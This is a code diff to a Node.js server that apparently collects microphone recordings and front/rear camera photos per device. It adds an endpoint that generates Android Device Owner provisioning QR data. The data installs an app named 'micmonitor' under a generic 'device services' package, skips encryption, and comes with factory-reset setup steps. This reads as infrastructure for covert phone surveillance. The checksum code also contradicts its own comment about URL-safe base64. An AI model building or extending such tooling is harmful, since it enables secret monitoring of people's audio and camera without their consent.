@@ -24,6 +24,7 @@ const https = require("https");
 const url = require("url");
 const fs = require("fs");
 const path = require("path");
+const crypto = require("crypto");
 
 const AUDIO_MAGIC_0 = 0x4d;
 const AUDIO_MAGIC_1 = 0x4d;
@@ -713,14 +714,32 @@ app.get("/api/recordings", (req, res) => {
 });
 
 app.get("/api/photos", (req, res) => {
+  const deviceId = req.query.deviceId; // Optional filter
   const files = fs
     .readdirSync(PHOTOS_DIR)
     .filter((f) => /\.(jpg|jpeg|png)$/i.test(f))
-    .map((f) => ({
-      name: f,
-      size: fs.statSync(path.join(PHOTOS_DIR, f)).size,
-      url: `/photos/${f}`,
-    }));
+    .filter((f) => {
+      // If deviceId filter is provided, only return photos for that device
+      if (deviceId) {
+        // Photo filename format: photo_DEVICEID_camera_timestamp.ext
+        const match = f.match(/^photo_([a-z0-9_-]+)_/i);
+        return match && match[1] === deviceId;
+      }
+      return true;
+    })
+    .map((f) => {
+      // Extract metadata from filename: photo_DEVICEID_CAMERA_TIMESTAMP.ext
+      const match = f.match(/^photo_([a-z0-9_-]+)_(front|rear)_(\d+)\.(jpg|jpeg|png)$/i);
+      return {
+        name: f,
+        size: fs.statSync(path.join(PHOTOS_DIR, f)).size,
+        url: `/photos/${f}`,
+        deviceId: match ? match[1] : null,
+        camera: match ? match[2] : null,
+        ts: match ? parseInt(match[3]) : null,
+      };
+    })
+    .sort((a, b) => (b.ts || 0) - (a.ts || 0)); // Sort by timestamp, newest first
   res.json(files);
 });
 
@@ -764,6 +783,64 @@ app.get("/api/version", (req, res) => {
 
 // Serve APK files
 app.use("/updates", express.static(UPDATES_DIR));
+
+// ════════════════════════════════════════════════════════════════════
+// QR Code Provisioning API (for fresh device setup)
+// ════════════════════════════════════════════════════════════════════
+
+// Generate QR provisioning data for Android Enterprise Device Owner setup
+app.get("/api/provisioning-qr", (req, res) => {
+  const apkPath = path.join(UPDATES_DIR, "app-release.apk");
+  
+  if (!fs.existsSync(apkPath)) {
+    return res.status(404).json({ 
+      error: "APK not found", 
+      message: "Upload app-release.apk to server/updates/ first" 
+    });
+  }
+  
+  // Calculate SHA-256 checksum of APK (required by Android)
+  const apkBuffer = fs.readFileSync(apkPath);
+  const sha256Hash = crypto.createHash("sha256").update(apkBuffer).digest("base64");
+  // Android requires URL-safe base64 with specific prefix
+  const checksum = sha256Hash;
+  
+  // Get server URL (use RENDER_EXTERNAL_URL or construct from request)
+  const serverUrl = process.env.RENDER_EXTERNAL_URL || 
+    `${req.protocol}://${req.get("host")}`;
+  
+  // Android Enterprise provisioning JSON
+  // Reference: https://developers.google.com/android/work/play/emm-api/prov-devices
+  const provisioningData = {
+    "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": 
+      "com.device.services.app/com.micmonitor.app.DeviceAdminReceiver",
+    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": 
+      `${serverUrl}/updates/app-release.apk`,
+    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": 
+      checksum,
+    "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true,
+    "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true,
+    "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": {
+      "server_url": serverUrl
+    }
+  };
+  
+  res.json({
+    provisioningData,
+    qrContent: JSON.stringify(provisioningData),
+    serverUrl,
+    apkUrl: `${serverUrl}/updates/app-release.apk`,
+    checksum,
+    apkSize: apkBuffer.length,
+    instructions: [
+      "1. Factory reset the device",
+      "2. On Welcome screen, tap 6 times quickly anywhere",
+      "3. QR scanner will appear",
+      "4. Scan the QR code generated from this data",
+      "5. Device will download APK and set as Device Owner automatically"
+    ]
+  });
+});
 
 // Serve recording files for download
 app.use("/recordings", express.static(RECORDINGS_DIR));
